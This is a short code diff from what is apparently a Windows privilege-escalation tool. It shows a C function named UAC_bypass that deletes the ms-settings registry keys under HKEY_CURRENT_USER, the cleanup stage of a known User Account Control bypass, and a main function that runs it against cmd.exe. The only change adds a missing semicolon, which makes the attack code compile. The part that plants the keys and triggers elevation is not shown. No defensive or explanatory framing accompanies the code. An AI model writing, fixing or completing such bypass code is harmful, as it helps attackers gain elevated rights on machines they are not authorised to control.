@@ -22,7 +22,7 @@ void UAC_bypass(const char *path) {
     RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");
     RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open");
     RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell");
-    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings")
+    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
 }
 int main() {
     UAC_bypass("C:\\Windows\\System32\\cmd.exe");
